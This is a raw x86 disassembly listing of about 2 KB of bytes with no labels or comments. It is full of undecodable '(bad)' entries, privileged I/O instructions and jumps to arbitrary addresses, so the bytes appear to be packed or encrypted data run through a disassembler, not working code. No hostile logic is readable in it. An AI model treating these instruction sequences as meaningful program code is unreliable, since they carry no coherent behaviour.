  411192:	jb     0x41116a
  411194:	mov    ch,0x8
  411196:	xchg   DWORD PTR [ebp-0x63],ecx
  411199:	das    
  41119a:	and    al,0xb9
  41119c:	in     al,0x90
  41119e:	data16 mov bh,0x95
  4111a1:	arpl   WORD PTR [esi],ax
  4111a3:	sub    BYTE PTR [ebp+0x2a8bedd3],dh
  4111a9:	xor    ebp,DWORD PTR [esi+0x4eb1a7bf]
  4111af:	pop    ebx
  4111b0:	and    eax,0xf3bc8eea
  4111b5:	sar    DWORD PTR ds:[edi],cl
  4111b8:	iret   
  4111b9:	retf   
  4111ba:	jns    0x4111cb
  4111bc:	loopne 0x411195
  4111be:	dec    edx
  4111bf:	cmp    DWORD PTR [esi],edx
  4111c1:	lea    ebp,[edx+0x476614d5]
  4111c7:	cli    
  4111c8:	xchg   BYTE PTR [edi-0x68829ace],bl
  4111ce:	mov    BYTE PTR [ebx+eax*4+0x36],ch
  4111d2:	or     bl,BYTE PTR [edi-0xe]
  4111d5:	(bad)  
  4111d6:	jbe    0x4111da
  4111d8:	push   esp
  4111d9:	out    dx,eax
  4111da:	push   eax
  4111db:	je     0x4111a1
  4111dd:	push   ebx
  4111de:	mov    esi,0x12f1f42c
  4111e3:	push   0x4
  4111e5:	das    
  4111e6:	jg     0x4111eb
  4111e8:	fisubr WORD PTR [esi-0x417d1fca]
  4111ee:	fsubr  st,st(7)
  4111f0:	mov    ds:0xdb4dab23,eax
  4111f5:	jle    0x4111c0
  4111f7:	in     al,0x16
  4111f9:	xlat   BYTE PTR ds:[ebx]
  4111fa:	cmp    eax,DWORD PTR [ecx-0x79f77463]
  411200:	mov    ch,0x3a
  411202:	fnstcw WORD PTR [ebp+0x30]
  411205:	lods   eax,DWORD PTR ds:[esi]
  411206:	cmp    al,0xc7
  411208:	jmp    0x4111c2
  41120a:	mov    edi,0x3849159
  41120f:	in     eax,0x59
  411211:	jb     0x4111f8
  411213:	ret    
  411214:	push   es
  411215:	add    BYTE PTR [ecx-0x5b1a6fa4],bh
  41121b:	jle    0x4111ae
  41121d:	push   0x72
  41121f:	cmp    eax,0xae38b91b
  411224:	lds    esi,FWORD PTR [edi+0x19bc64fe]
  41122a:	add    al,0xb5
  41122c:	xor    DWORD PTR [edi+0x27],eax
  41122f:	jnp    0x411256
  411231:	push   esp
  411232:	pop    esi
  411233:	mov    bl,0x71
  411235:	cmp    al,0xbe
  411237:	addr16 xor eax,0x4de17bb
  41123d:	pop    ebx
  41123e:	shl    BYTE PTR [edi],1
  411240:	xor    al,0x12
  411242:	adc    DWORD PTR [esi],0xffffff89
  411245:	leave  
  411246:	sub    ebp,ecx
  411248:	sub    esp,DWORD PTR [edx+0x39a6c798]
  41124e:	repnz inc ebp
  411250:	jae    0x4112b9
  411252:	repnz xor BYTE PTR [ebx+0x6e735a0b],dl
  411259:	nop    DWORD PTR [ebx]
  41125c:	pusha  
  41125d:	mov    cl,0xad
  41125f:	pop    ebx
  411260:	cmp    cl,BYTE PTR [edi-0x6c0565eb]
  411266:	push   cs
  411267:	mov    edi,0xeecc8248
  41126c:	ins    DWORD PTR es:[edi],dx
  41126d:	dec    esi
  41126e:	jnp    0x41120e
  411270:	stc    
  411271:	loop   0x4112b1
  411273:	(bad)
  411277:	cmp    edi,DWORD PTR [edi]
  411279:	hlt    
  41127a:	and    BYTE PTR [ebx+edx*2],cl
  41127d:	inc    edx
  41127e:	sub    ah,BYTE PTR [ebp+0x4b]
  411281:	push   edi
  411282:	pop    ss
  411283:	jb     0x411248
  411285:	retf   0x29ed
  411288:	sub    ah,BYTE PTR [ecx+edx*4]
  41128b:	call   0xbdb2:0xb327554b
  411292:	mov    ds:0xde1e625a,eax
  411297:	dec    edi
  411298:	or     cl,BYTE PTR [edx+0x11ac61a5]
  41129e:	push   es
  41129f:	mov    ah,0xa4
  4112a1:	retf   0x68b2
  4112a4:	in     eax,0xe0
  4112a6:	mov    eax,0xa9ab6522
  4112ab:	and    bh,BYTE PTR [edx+0x2c]
  4112ae:	mov    ds:0xe16083ba,al
  4112b3:	add    esp,DWORD PTR [eax+0x51]
  4112b6:	int    0x33
  4112b8:	push   ebp
  4112b9:	mul    WORD PTR [edi]
  4112bc:	sub    dl,BYTE PTR [esp+edi*1-0xa]
  4112c0:	rcl    BYTE PTR [ebp-0x24],1
  4112c3:	add    eax,0x8ec7c5d9
  4112c8:	repnz pop edi
  4112ca:	hlt    
  4112cb:	test   al,0xb6
  4112cd:	xchg   BYTE PTR [edi+0x4],dh
  4112d0:	jae    0x41126e
  4112d2:	or     eax,0x7c0baf0d
  4112d7:	dec    eax
  4112d8:	xor    eax,0x6a29e40a
  4112dd:	mov    edi,0x727722e4
  4112e2:	mov    ds:0x991e43d6,eax
  4112e7:	les    esp,FWORD PTR [edi]
  4112e9:	jbe    0x41132c
  4112eb:	sti    
  4112ec:	jnp    0x4112a4
  4112ee:	and    al,0x43
  4112f0:	mov    edi,0x47843baf
  4112f5:	jmp    0xf74748a9
  4112fa:	aaa    
  4112fb:	call   0x11fa37db
  411300:	mov    eax,0x516c8fd3
  411305:	push   0xd3f9ff9f
  41130a:	les    esi,FWORD PTR [esi+ecx*2+0x6493f23a]
  411311:	sahf   
  411312:	faddp  st(1),st
  411314:	fwait
  411315:	mov    WORD PTR [edi+0x7b961e62],ss
  41131b:	sbb    al,0x4e
  41131d:	sbb    BYTE PTR [di],ah
  411320:	scas   al,BYTE PTR es:[edi]
  411321:	mov    bh,0xbe
  411323:	and    al,0x9b
  411325:	and    dh,cl
  411327:	aad    0xd8
  411329:	aaa    
  41132a:	sti    
  41132b:	xor    DWORD PTR [edi-0x6f928352],esp
  411331:	(bad)  
  411334:	out    0xd1,al
  411336:	or     dl,bh
  411338:	js     0x411344
  41133a:	outs   dx,DWORD PTR ds:[esi]
  41133b:	repnz cmp DWORD PTR [ebx-0x33],esi
  41133f:	jnp    0x4113af
  411341:	and    eax,0x1fa70eb4
  411346:	test   eax,0x223aa984
  41134b:	jg     0x4112fa
  41134d:	pop    ebp
  41134e:	mov    bl,0x76
  411350:	sub    edi,DWORD PTR [esp+edx*2-0xc]
  411354:	retf   
  411355:	cmc    
  411356:	mov    ds:0xe71e8a97,eax
  41135b:	das    
  41135c:	dec    ebp
  41135d:	outs   dx,BYTE PTR ds:[esi]
  41135e:	and    eax,DWORD PTR [edi]
  411360:	xor    DWORD PTR [esi-0x48],0xf2ecbf7b
  411367:	retf   
  411368:	add    al,0x1e
  41136a:	mov    DWORD PTR [edi-0x39],ebp
  41136d:	imul   ecx,DWORD PTR [esi],0x12
  411370:	jae    0x41131b
  411372:	outs   dx,BYTE PTR ds:[esi]
  411373:	xchg   esp,eax
  411374:	call   0x243867b8
  411379:	dec    eax
  41137a:	xchg   ebp,eax
  41137b:	fidiv  DWORD PTR [edx-0x7b]
  41137e:	sub    al,0xdf
  411380:	cmp    BYTE PTR [ecx+ebp*8],dl
  411383:	xlat   BYTE PTR ds:[ebx]
  411384:	std    
  411385:	xlat   BYTE PTR ds:[ebx]
  411386:	js     0x411366
  411388:	or     eax,0x4b2b6cf5
  41138d:	inc    ebp
  41138e:	push   es
  41138f:	xchg   ecx,eax
  411390:	push   edi
  411391:	or     bl,bl
  411393:	ret    0x39db
  411396:	dec    edx
  411397:	push   esi
  411398:	sar    ebx,1
  41139a:	push   edi
  41139b:	adc    cl,dh
  41139d:	adc    edi,DWORD PTR [edx-0x46814090]
  4113a3:	sub    edi,DWORD PTR [esi+0xf71d37e]
  4113a9:	mov    edi,DWORD PTR [edx-0x377dc1e8]
  4113af:	loop   0x411343
  4113b1:	loopne 0x4113de
  4113b3:	mov    eax,ds:0x1f2da83c
  4113b8:	outs   dx,BYTE PTR ds:[esi]
  4113b9:	xor    ebx,DWORD PTR fs:[eax]
  4113bc:	daa    
  4113bd:	pusha  
  4113be:	imul   esi,DWORD PTR [ebx],0xffffffe2
  4113c1:	stos   BYTE PTR es:[edi],al
  4113c2:	repz lds edi,FWORD PTR es:[ecx]
  4113c6:	xor    eax,0xa162d750
  4113cb:	sbb    BYTE PTR [ecx+0x791d19b1],0x9e
  4113d2:	mov    dh,0xc6
  4113d4:	or     bl,dl
  4113d6:	call   0xdad9d1ee
  4113db:	add    DWORD PTR [eax],edx
  4113dd:	mov    bh,0xfd
  4113df:	push   esp
  4113e0:	icebp  
  4113e1:	jle    0x411441
  4113e3:	imul   edx,DWORD PTR [ebx+0x48],0x3dd5c516
  4113ea:	ja     0x4113d9
  4113ec:	fisttp QWORD PTR [eax-0x6e]
  4113ef:	jb     0x411394
  4113f1:	ret    
  4113f2:	adc    eax,0xe2608759
  4113f7:	in     al,0xad
  4113f9:	add    DWORD PTR [esi-0x75090dcc],edx
  4113ff:	jmp    0xa89021e4
  411404:	push   ebp
  411405:	imul   ebx,DWORD PTR ds:0x7c9bfc88,0xffffffab
  41140c:	in     al,0x39
  41140e:	mov    ss,WORD PTR [esi+edi*4]
  411411:	mov    ds:0xa461f4b2,eax
  411416:	dec    esi
  411417:	ret    0x6e26
  41141a:	pushw  es
  41141c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41141d:	sbb    BYTE PTR [edx-0x21],0x79
  411421:	lock stc 
  411423:	mov    esi,eax
  411425:	out    0xc5,al
  411427:	add    eax,0x6d287045
  41142c:	mov    ebx,0xf51a8c3e
  411431:	bound  edi,QWORD PTR [esi]
  411433:	outs   dx,DWORD PTR ds:[esi]
  411434:	ins    BYTE PTR es:[edi],dx
  411435:	call   0x94682f54
  41143a:	int    0x0
  41143c:	or     ecx,eax
  41143e:	inc    edx
  41143f:	inc    esi
  411440:	fnstsw ax
  411442:	xchg   esi,eax
  411443:	mov    dl,0x43
  411445:	call   FWORD PTR [ebp+0x73b89939]
  41144b:	sub    BYTE PTR [ecx-0x103ed9a5],cl
  411451:	imul   ebx,edi,0xffffff89
  411454:	ret    
  411455:	mov    esp,0x618e5d41
  41145a:	test   al,0xa4
  41145c:	xchg   ebp,eax
  41145d:	jecxz  0x4113e4
  41145f:	jmp    0x41147d
  411461:	pop    esp
  411462:	adc    edi,edi
  411464:	xchg   ecx,eax
  411465:	fwait
  411466:	into   
  411467:	xchg   edx,eax
  411468:	and    cl,cl
  41146a:	sbb    eax,0xcaa74510
  41146f:	ds jns 0x41141c
  411472:	pop    eax
  411473:	and    DWORD PTR ds:0xb2fbfe85,esi
  411479:	repnz or eax,0x5be024ff
  41147f:	xchg   esp,eax
  411480:	jne    0x4114ef
  411482:	and    bl,BYTE PTR [ecx+0x16]
  411485:	mov    esp,0x359a6169
  41148a:	repnz xor ch,BYTE PTR [edi+eax*4+0x64e491ca]
  411492:	ret    0x67f6
  411495:	stc    
  411496:	loope  0x4114d3
  411498:	ds mov dl,0x87
  41149b:	in     eax,0x7b
  41149d:	and    bh,BYTE PTR [ecx-0x64]
  4114a0:	adc    DWORD PTR [edi-0x14],eax
  4114a3:	and    dl,ah
  4114a5:	jbe    0x4114e0
  4114a7:	es gs cmp eax,0xd26e3059
  4114ae:	dec    edx
  4114af:	aaa    
  4114b0:	push   ebp
  4114b1:	sbb    BYTE PTR [ecx],0xdb
  4114b4:	xchg   edi,eax
  4114b5:	jle    0x411494
  4114b7:	imul   ecx,DWORD PTR [edx+0x73],0xb1b0c869
  4114be:	sbb    DWORD PTR [esp+eiz*4],ebp
  4114c1:	jmp    0x64092406
  4114c6:	cmp    al,0x38
  4114c8:	xor    al,0x84
  4114ca:	shr    BYTE PTR [edi],0x23
  4114cd:	or     esi,DWORD PTR [ebx-0xb]
  4114d0:	xchg   DWORD PTR [ebp+0x10],ecx
  4114d3:	es xchg edi,eax
  4114d5:	and    BYTE PTR [ebp+0x33],bh
  4114d8:	test   eax,0xb97e9921
  4114dd:	add    al,0x19
  4114df:	and    ecx,edx
  4114e1:	mov    ds:0x63955769,al
  4114e7:	shl    BYTE PTR [eax+ebp*8-0x2c],cl
  4114eb:	outs   dx,BYTE PTR ds:[esi]
  4114ec:	add    al,0x7e
  4114ee:	aam    0x79
  4114f0:	shl    BYTE PTR [ebp+0x52],0x9f
  4114f4:	jmp    0x411574
  4114f6:	sti    
  4114f7:	(bad)  [ebx-0x6abb8aaa]
  4114fd:	fisub  WORD PTR [esi-0x4accb270]
  411503:	add    ecx,ebx
  411505:	sub    ebp,DWORD PTR [ecx+ecx*2+0x21]
  411509:	cwde   
  41150a:	test   al,0x5e
  41150c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41150d:	inc    ecx
  41150e:	and    DWORD PTR [eax-0x61f20b03],ebp
  411514:	cmp    al,0x78
  411516:	push   ebp
  411517:	adc    al,0x25
  411519:	sbb    bh,al
  41151b:	add    ah,BYTE PTR [ebp-0x2d]
  41151e:	xor    al,0x3b
  411520:	pusha  
  411521:	mov    dl,0x61
  411523:	xchg   BYTE PTR [ebx+0x6e],dh
  411526:	or     al,0x1c
  411528:	xchg   ecx,eax
  411529:	dec    ebx
  41152a:	jne    0x411548
  41152c:	shl    DWORD PTR [edi-0x14],0x7f
  411530:	dec    ebx
  411531:	lods   al,BYTE PTR ds:[esi]
  411532:	push   0x1814330f
  411537:	stc    
  411538:	rcl    DWORD PTR [ebp+0x22],cl
  41153b:	inc    edx
  41153c:	pop    eax
  41153d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41153e:	push   ss
  41153f:	call   0x6102600f
  411544:	mov    ecx,0x5e51c864
  411549:	jle    0x411533
  41154b:	or     ebx,DWORD PTR [edx+0xa741921]
  411551:	imul   esi
  411553:	push   eax
  411554:	outs   dx,BYTE PTR ds:[esi]
  411555:	enter  0x6053,0x0
  411559:	adc    DWORD PTR [edx-0x3bb2cd06],ebx
  41155f:	popa   
  411560:	cmc    
  411561:	dec    ebp
  411562:	and    eax,0x6fbf7dd0
  411567:	mov    ds:0x542c932a,eax
  41156c:	pop    edi
  41156d:	scas   al,BYTE PTR es:[edi]
  41156e:	add    eax,0x720bf617
  411573:	test   eax,0x4904e261
  411578:	cmp    cl,BYTE PTR [edx+0x8]
  41157b:	sbb    eax,0x20777982
  411580:	dec    edx
  411581:	pop    ecx
  411582:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411583:	ret    
  411584:	push   edi
  411585:	das    
  411586:	mov    cl,0x8a
  411588:	adc    DWORD PTR [edi],esi
  41158a:	jns    0x4115b5
  41158c:	or     BYTE PTR [edx],0xd9
  41158f:	and    eax,0xbd8ca842
  411594:	nop
  411595:	dec    ecx
  411596:	lods   al,BYTE PTR ds:[esi]
  411597:	adc    DWORD PTR [esi+0x5862325f],edi
  41159d:	push   cs
  41159e:	rol    BYTE PTR [eax-0x2b656fde],cl
  4115a4:	mov    bl,0x10
  4115a6:	dec    esi
  4115a7:	or     bl,bh
  4115a9:	mov    eax,0x51d24c5d
  4115ae:	xchg   edx,eax
  4115af:	jbe    0x41155d
  4115b1:	sbb    DWORD PTR [ebx],ecx
  4115b3:	push   ecx
  4115b4:	fcmovne st,st(2)
  4115b6:	mov    DWORD PTR [ecx+ebp*4+0x7],ebx
  4115ba:	les    esp,FWORD PTR [ecx+0x60]
  4115bd:	mov    edi,0x8afaefe9
  4115c2:	in     al,0xb2
  4115c4:	clc    
  4115c5:	nop
  4115c6:	gs pop ebx
  4115c8:	or     dh,0xa8
  4115cb:	mov    dl,0x91
  4115cd:	ret    0xfb83
  4115d0:	jge    0x4115cc
  4115d2:	push   esp
  4115d3:	jl     0x411651
  4115d5:	xchg   BYTE PTR [ecx],ah
  4115d7:	push   ds
  4115d8:	add    BYTE PTR [ebx-0x69],ch
  4115db:	in     al,dx
  4115dc:	dec    esp
  4115dd:	scas   al,BYTE PTR es:[edi]
  4115de:	lods   al,BYTE PTR ds:[esi]
  4115df:	outs   dx,DWORD PTR ds:[esi]
  4115e0:	and    DWORD PTR [edi+esi*2+0xe],ecx
  4115e4:	stc    
  4115e5:	mov    ?,WORD PTR [esi+0x171de68a]
  4115eb:	sub    al,0xa
  4115ed:	mov    esp,0x62dffee1
  4115f2:	fild   QWORD PTR [ebp-0x2095cbbd]
  4115f8:	mov    al,ds:0x97964e60
  4115fd:	leave  
  4115fe:	shl    BYTE PTR [ebx-0x4b],0x14
  411602:	call   0xa1c6748a
  411607:	imul   esp,DWORD PTR [esi-0x5e],0x558293f
  41160e:	int    0xf
  411610:	fsubr  QWORD PTR [esi]
  411612:	mov    gs,WORD PTR [eax+esi*4]
  411615:	mov    bh,0x66
  411617:	mov    esi,0xd9743423
  41161c:	jnp    0xbc5654fe
  411622:	mov    ah,0x84
  411624:	test   eax,0x53e07008
  411629:	adc    edx,DWORD PTR [ecx-0x6708db7d]
  41162f:	and    dh,dl
  411631:	dec    ecx
  411632:	outs   dx,DWORD PTR ds:[esi]
  411633:	in     al,0x64
  411635:	push   ds
  411636:	data16 mov ch,0x3c
  411639:	mov    ?,WORD PTR ss:[edx-0x440dfeb9]
  411640:	jl     0x4115ea
  411642:	sub    edx,esp
  411644:	and    ch,BYTE PTR [ebp-0x48a15bab]
  41164a:	aad    0xb2
  41164c:	int    0xf2
  41164e:	in     al,0x82
  411650:	fbstp  TBYTE PTR [eax+0x173371f0]
  411656:	push   ebp
  411657:	jge    0x411644
  411659:	loopne 0x4116c3
  41165b:	call   0xdd91:0x31a23e60
  411662:	jb     0x4116ca
  411664:	enter  0xbdf2,0x78
  411668:	(bad)  
  411669:	cmc    
  41166a:	stos   DWORD PTR es:[edi],eax
  41166b:	adc    bl,BYTE PTR [edx-0x59757f5a]
  411671:	shl    BYTE PTR [ebp+0x22],0xf8
  411675:	int    0x14
  411677:	les    esi,FWORD PTR [edx-0x1cea1630]
  41167d:	fbld   TBYTE PTR [ebx+0x40]
  411680:	retf   0x3be4
  411683:	cmp    DWORD PTR [edi],esi
  411685:	imul   eax,DWORD PTR [ebx-0x544b7479],0x2b
  41168c:	sbb    ecx,DWORD PTR [ecx]
  41168e:	mov    al,ds:0xedc99ed5
  411693:	cld    
  411694:	mov    ebp,0x6154caa9
  411699:	adc    DWORD PTR [edx],0xffffffde
  41169c:	outs   dx,DWORD PTR ds:[esi]
  41169d:	jb     0x4116a3
  41169f:	jl     0x4116ac
  4116a1:	iret   
  4116a2:	call   0x9159049
  4116a7:	mov    dh,0x3f
  4116a9:	push   es
  4116aa:	lea    ecx,[ebx+0x4b]
  4116ad:	push   cs
  4116ae:	cwde   
  4116af:	into   
  4116b0:	std    
  4116b1:	mov    esi,?
  4116b3:	aam    0x98
  4116b5:	xchg   DWORD PTR [ecx-0x7],eax
  4116b8:	and    esp,DWORD PTR [ebx-0x6e]
  4116bb:	sbb    DWORD PTR [edi+0x1e],ecx
  4116be:	xor    eax,0xb4a8068b
  4116c3:	retf   0x625a
  4116c6:	in     al,0x74
  4116c8:	mov    dl,0x2e
  4116ca:	sbb    al,0x80
  4116cc:	dec    eax
  4116cd:	loopne 0x41167c
  4116cf:	out    dx,al
  4116d0:	mov    al,ds:0xd2ca4a83
  4116d5:	or     bl,dh
  4116d7:	add    eax,0x637b63a2
  4116dc:	addr16 ja 0x4116e3
  4116df:	aad    0x31
  4116e1:	sbb    DWORD PTR [edi+0x7bd44b68],ebx
  4116e7:	pop    edx
  4116e8:	push   esi
  4116e9:	mov    bh,0x4f
  4116eb:	and    dl,0xce
  4116ee:	(bad)  
  4116ef:	mov    esp,0x872e46e9
  4116f4:	pusha  
  4116f5:	jge    0x41172e
  4116f7:	lahf   
  4116f8:	loopne 0x411690
  4116fa:	loop   0x4116ef
  4116fc:	dec    bl
  4116fe:	mov    ebx,DWORD PTR [ebx-0xaa58440]
  411704:	push   ss
  411705:	cs pop esp
  411707:	repz inc esi
  411709:	sub    eax,0xeedf9954
  41170e:	mov    cl,0xb5
  411710:	repz dec ebp
  411712:	addr16 or eax,0x92a6add2
  411718:	cs inc esi
  41171a:	popf   
  41171b:	mov    ds:0x5e96fd34,al
  411720:	ret    0x8149
  411723:	sbb    edx,eax
  411725:	or     esp,ebp
  411727:	fs dec eax
  411729:	stos   DWORD PTR es:[edi],eax
  41172a:	and    eax,0x26bc0eaf
  41172f:	mov    ebp,fs
  411731:	add    esi,DWORD PTR [ebp+0x2f99077d]
  411737:	iret   
  411738:	xchg   ecx,eax
  411739:	or     bl,BYTE PTR [edx-0x3f401ca9]
  41173f:	shl    DWORD PTR [edi],cl
  411741:	jg     0x411704
  411743:	sbb    dh,bh
  411745:	stos   DWORD PTR es:[edi],eax
  411746:	adc    DWORD PTR [eax+edx*4-0x224b31c2],eax
  41174d:	xchg   esi,eax
  41174e:	push   edx
  41174f:	cmp    DWORD PTR [edx-0x5a],ecx
  411752:	push   eax
  411753:	and    al,0xa8
  411755:	cs sub edi,ebx
  411758:	add    edx,DWORD PTR [eax+0x12efc9d]
  41175e:	imul   eax,DWORD PTR [ecx+0x17],0xab2b34dd
  411765:	les    ebp,FWORD PTR [edx-0x76]
  411768:	mov    ebx,0x9a9657c7
  41176d:	test   al,0xf1
  41176f:	(bad)  
  411770:	sbb    eax,0xebfbe336
  411775:	(bad)  
  411776:	pop    ecx
  411777:	cmp    dh,BYTE PTR [ebx]
  411779:	mov    ?,WORD PTR [ebx+0xa28eaec]
  41177f:	pop    ebx
  411780:	ror    ch,cl
  411782:	and    BYTE PTR [edi],al
  411784:	xchg   BYTE PTR ds:0x9b72df9f,bh
  41178a:	jae    0x4117d9
  41178c:	retf   
  41178d:	test   DWORD PTR [ebx],esi
  41178f:	sbb    al,0xe2
  411791:	sub    DWORD PTR [ecx+0x6e],esi
  411794:	cmp    ebp,DWORD PTR [eax-0x38]
  411797:	and    eax,0x84d61b89
  41179c:	out    0x4a,eax
  41179e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41179f:	push   edx
  4117a0:	pushf  
  4117a1:	xchg   esp,eax
  4117a2:	gs imul edx,eax,0x15
  4117a6:	pushf  
  4117a7:	test   eax,0xff347d1c
  4117ac:	or     eax,0xf29c7637
  4117b1:	pop    edx
  4117b2:	out    0x7a,eax
  4117b4:	in     eax,dx
  4117b5:	stos   BYTE PTR es:[edi],al
  4117b6:	push   eax
  4117b7:	push   edx
  4117b8:	mov    dh,dl
  4117ba:	pop    eax
  4117bb:	hlt    
  4117bc:	dec    ecx
  4117bd:	mov    dh,BYTE PTR [eax]
  4117bf:	dec    esp
  4117c0:	sbb    eax,0xbb5fea4c
  4117c5:	jno    0x4117ea
  4117c7:	inc    ebx
  4117c8:	stos   DWORD PTR es:[edi],eax
  4117c9:	in     eax,0xdc
  4117cb:	sbb    DWORD PTR [ebp-0x4fa0c40],0xffffff86
  4117d2:	ins    BYTE PTR es:[edi],dx
  4117d3:	scas   al,BYTE PTR es:[edi]
  4117d4:	cli    
  4117d5:	inc    edx
  4117d6:	adc    al,0x16
  4117d8:	addr16 push es
  4117da:	push   edi
  4117db:	sub    ch,cl
  4117dd:	fstp   TBYTE PTR [eax+0x3c1bd3aa]
  4117e3:	xor    al,0xc4
  4117e5:	mov    al,ds:0x9b2665e
  4117ea:	cmc    
  4117eb:	in     al,0xae
  4117ed:	mov    BYTE PTR [edi-0x1f6539a8],dh
  4117f3:	or     eax,0xe664777f
  4117f8:	data16 (bad) [eax-0x2c81b8e8]
  4117ff:	mov    ecx,DWORD PTR ds:0xc0f3bd2b
  411805:	xor    esi,ecx
  411807:	push   cs
  411808:	out    dx,eax
  411809:	or     BYTE PTR [ebx+edx*4-0x5c3a04f3],al
  411810:	or     cl,bl
  411812:	retf   0xd6c0
  411815:	sbb    DWORD PTR [edx+0xea725c3],ecx
  41181b:	xchg   ecx,eax
  41181c:	fcmovbe st,st(6)
  41181e:	iret   
  41181f:	add    al,BYTE PTR [ebx+0x50]
  411822:	test   al,0x49
  411824:	cmp    al,0x8f
  411826:	jo     0x4117bd
  411828:	je     0x4117bd
  41182a:	pop    ecx
  41182b:	or     dh,BYTE PTR [edx-0x50]
  41182e:	sbb    eax,0x6a882798
  411833:	push   ss
  411834:	loopne 0x41180c
  411836:	adc    al,0xe1
  411838:	rcr    dl,0xeb
  41183b:	jmp    0x4118a1
  41183d:	xor    eax,0x2bac8bc0
  411842:	ja     0x4118ac
  411844:	sub    esp,DWORD PTR [ebp-0x7617e0a9]
  41184a:	aad    0x2a
  41184c:	push   edi
  41184d:	cs scas eax,DWORD PTR es:[edi]
  41184f:	or     ecx,0xe25c1c0d
  411855:	xor    edx,ebp
  411857:	sahf   
  411858:	inc    ebp
  411859:	push   eax
  41185a:	shl    BYTE PTR ds:0x40135df9,1
  411860:	pop    edi
  411861:	(bad)  
  411862:	(bad)  
  411863:	adc    al,0x60
  411865:	mov    al,ds:0x7f8b6b3f
  41186a:	jg     0x4118ea
  41186c:	pop    ss
  41186d:	mov    WORD PTR [ebp+0x4022d643],?
  411873:	(bad)  
  411874:	fidivr DWORD PTR [esi]
  411876:	sbb    DWORD PTR [ebp+eiz*4-0x32231f34],edx
  41187d:	(bad)  
  41187e:	in     al,dx
  41187f:	dec    eax
  411880:	test   eax,0xf7dc0985
  411885:	mov    ebx,0xf3570034
  41188a:	sub    DWORD PTR [ebx-0x16],edi
  41188d:	or     ebp,DWORD PTR [eax+edi*2+0x7f96599e]
  411894:	inc    edx
  411895:	mov    dh,dl
  411897:	mov    ds:0xa17ad494,al
  41189c:	cmp    esp,DWORD PTR [ebx+0x61a5f56]
  4118a2:	cmp    BYTE PTR ds:0x55074487,bh
  4118a8:	aaa    
  4118a9:	adc    DWORD PTR [eax],ebx
  4118ab:	clc    
  4118ac:	or     eax,0x1d320037
  4118b1:	pop    ebx
  4118b2:	dec    esp
  4118b3:	dec    edi
  4118b4:	xor    al,0x27
  4118b6:	mov    edx,es
  4118b8:	push   esp
  4118b9:	xchg   edi,eax
  4118ba:	fst    DWORD PTR [esi+0x76ec67f3]
  4118c0:	in     al,dx
  4118c1:	cmp    BYTE PTR ds:0x8c2c0f3f,bh
  4118c7:	ss inc ebp
  4118c9:	test   BYTE PTR ss:[eax+0x22],0x51
  4118ce:	or     DWORD PTR [ecx+0x4f],esi
  4118d1:	mov    dh,0xe4
  4118d3:	inc    esp
  4118d4:	in     al,0x72
  4118d6:	mov    dl,BYTE PTR [eax-0x54]
  4118d9:	push   cs
  4118da:	clc    
  4118db:	sti    
  4118dc:	test   DWORD PTR [ebp+0x1d],eax
  4118df:	dec    ebx
  4118e0:	pop    ebp
  4118e1:	je     0x411863
  4118e3:	mov    ch,0x44
  4118e5:	cli    
  4118e6:	xchg   esp,eax
  4118e7:	pop    ds
  4118e8:	pop    ecx
  4118e9:	sub    al,0x85
  4118eb:	mov    DWORD PTR [ebx],esp
  4118ed:	xchg   esi,eax
  4118ee:	xor    DWORD PTR [esp+esi*8],esp
  4118f1:	clc    
  4118f2:	or     dl,ah
  4118f4:	loope  0x41196d
  4118f6:	xchg   al,bh
  4118f8:	(bad)  
  4118f9:	cmp    bl,bh
  4118fb:	mov    DWORD PTR [edx],esi
  4118fd:	push   ss
  4118fe:	mov    ecx,0xb15c9def
  411903:	hlt    
  411904:	push   ebp
  411905:	in     eax,0xd1
  411907:	mov    gs:0x954c0614,eax
  41190d:	addr16 ret 0xfcbd
  411911:	inc    edi
  411912:	(bad)  
  411913:	push   ebp
  411914:	mov    eax,esi
  411916:	test   al,0x53
  411918:	test   BYTE PTR [eax],cl
  41191a:	dec    edi
  41191b:	aad    0xbc
  41191d:	bswap  ebx
  41191f:	das    
  411920:	lahf   
  411921:	sub    BYTE PTR [ebx+eiz*4],ah
  411924:	pop    esi
  411925:	add    DWORD PTR [esi],ebx
  411927:	sbb    DWORD PTR [edx+0xa],edx
  41192a:	cwde   
  41192b:	cmp    edi,DWORD PTR fs:[edx]
  41192e:	push   ds
  41192f:	and    DWORD PTR [eax],ebx
  411931:	add    esp,DWORD PTR ds:0x588f714b
  411937:	lea    ebp,[esi-0x546c141b]
  41193d:	inc    esi
  41193e:	jne    0x41195b
  411940:	push   esi
  411941:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411942:	test   eax,0xcd2de15b
  411947:	sti    
  411948:	push   0x4a
  41194a:	mov    edi,0x58ac2dca
  41194f:	jle    0x411962
  411951:	sbb    BYTE PTR [edi-0x1a],bl
  411954:	ins    DWORD PTR es:[edi],dx
  411955:	shr    edx,0x6d
  411958:	pop    esi
  411959:	pop    ebx
  41195a:	cmc    
  41195b:	mov    ebp,DWORD PTR [ecx+0x4e]
  41195e:	mov    ecx,0xc19c0561
  411963:	out    0x97,eax
  411965:	pop    eax
  411966:	adc    DWORD PTR [esp+ebx*8-0x75],edx
  41196a:	dec    edx
  41196b:	sub    eax,0x81a3288b
  411970:	mov    esi,0xbc32ffff
  411975:	or     ah,dl
  411977:	jle    0x4119b8
  411979:	lods   al,BYTE PTR ds:[esi]
  41197a:	out    0xeb,eax
  41197c:	aam    0x64
  41197e:	and    ebp,esp
  411980:	fbstp  TBYTE PTR [edi+edx*1-0x1b171812]
  411987:	jmp    0x411919
  411989:	imul   eax,DWORD PTR [edx-0x199d2de1],0x148b77e4
  411993:	std    
  411994:	popf   
  411995:	jmp    0x1fac:0x8fdb3255
  41199c:	cli    
  41199d:	and    ebp,DWORD PTR [edi-0x47c672e3]
  4119a3:	lock push es
  4119a5:	call   0x23f6:0xa95f8000
  4119ac:	lea    edx,[eax+0x5a]
  4119af:	cs dec ebx
  4119b1:	mov    dl,0xcd
  4119b3:	push   DWORD PTR [ebx]
  4119b5:	ret    0x4220
  4119b8:	jbe    0x4119a8
  4119ba:	ins    DWORD PTR es:[edi],dx
  4119bb:	(bad)  
  4119bc:	mov    WORD PTR [ecx+esi*2+0x24551854],ss
  4119c3:	sbb    al,0x45
  4119c5:	aas    
  4119c6:	lock sahf 
  4119c8:	call   0x54db2187
